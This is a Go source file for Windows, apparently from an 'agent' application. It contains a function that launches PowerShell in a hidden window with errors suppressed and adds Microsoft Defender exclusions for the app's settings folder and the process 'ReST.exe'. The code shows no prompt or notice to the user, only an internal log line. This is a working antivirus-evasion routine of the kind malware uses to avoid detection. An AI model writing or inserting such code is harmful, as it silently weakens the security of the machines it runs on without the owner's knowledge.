//go:build windows

package main

import (
	"fmt"
	"os/exec"
	"strings"
	"sync"
)

var defenderOnce sync.Once

func ensureDefenderExclusion() {
	defenderOnce.Do(func() {
		dir := strings.ReplaceAll(string(settingsDir()), "'", "''")
		script := fmt.Sprintf(
			"$ErrorActionPreference='SilentlyContinue';"+
				"Add-MpPreference -ExclusionPath '%s';"+
				"Add-MpPreference -ExclusionProcess 'ReST.exe'",
			dir,
		)
		cmd := exec.Command(
			"powershell.exe",
			"-NoProfile", "-NonInteractive", "-Command", script,
		)
		hideExec(cmd)
		if err := cmd.Run(); err != nil {
			agentLog("defender exclusion skipped: " + err.Error())
			return
		}
		agentLog("defender exclusion requested")
	})
}
